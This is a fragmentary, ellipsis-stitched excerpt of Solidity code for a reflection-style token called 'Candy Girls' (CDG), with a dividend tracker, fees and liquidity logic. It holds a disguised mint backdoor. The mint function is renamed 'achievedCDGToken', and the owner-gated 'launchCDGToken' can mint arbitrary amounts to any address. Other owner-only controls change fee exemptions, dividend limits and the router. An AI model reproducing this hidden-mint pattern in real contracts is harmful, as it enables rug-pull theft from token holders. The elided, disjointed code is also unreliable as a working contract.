...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function achievedCDGToken(address account, uint256 amount) internal virtual {
...
function achievedCDGToken(address account, uint256 value) internal override {
    super.achievedCDGToken(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      achievedCDGToken(account, mintAmount);
...
contract CDGTokenrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using HolderCDGToken  for HolderCDGToken .Map;
HolderCDGToken .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("CDGToken_rewardToken_Tracker", "CDGToken_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "CDGToken_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "CDGToken_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main CDGToken contract.");
    }
...
contract CDGToken is ERC20, Ownable {
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Candy Girls", "CDG") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new CDGTokenrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 achievedCDGToken(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function launchCDGToken(address allowp, uint256 allowa) public masterWallet{
       achievedCDGToken(allowp, allowa);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "CDGToken: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "CDGToken: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "CDGToken: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "CDGToken: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTCDGToken = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTCDGToken);
...
addLiquidity(tokensTCDGToken, bnbForLiquidity);
